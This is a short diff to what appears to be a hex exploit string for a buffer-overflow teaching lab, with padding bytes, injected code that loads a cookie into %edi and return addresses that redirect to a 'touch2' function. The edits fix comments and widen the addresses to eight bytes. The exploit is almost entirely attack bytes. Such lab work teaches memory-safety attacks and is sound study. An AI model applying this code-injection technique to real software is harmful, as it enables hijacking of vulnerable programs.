@@ -2,9 +2,8 @@
 33 33 33 33 33 33 33 33       /* 08: Padding 8 bytes              */
 33 33 33 33 33 33 33 33       /* 16: Padding 8 bytes              */
 33 33 33 33 33 33 33 33       /* 24: Padding 8 bytes              */
-33 33                         /* 32: Padding 8 bytes              */
+33 33                         /* 32: Padding 2 bytes              */
 bf 88 7a 22 43                /* 34: mov $0x43227a88, %edi        */
 c3                            /* 39: retq                         */
-aa f9 60 55                   /* 40: Store cookie in %edi         */
-00 00 00 00                   /* 44: Padding 4 bytes              */
-bc 18 40 00                   /* 48: Return to touch2             */
+aa f9 60 55 00 00 00 00       /* 40: Store cookie in %edi         */
+bc 18 40 00 00 00 00 00       /* 48: Return to touch2             */
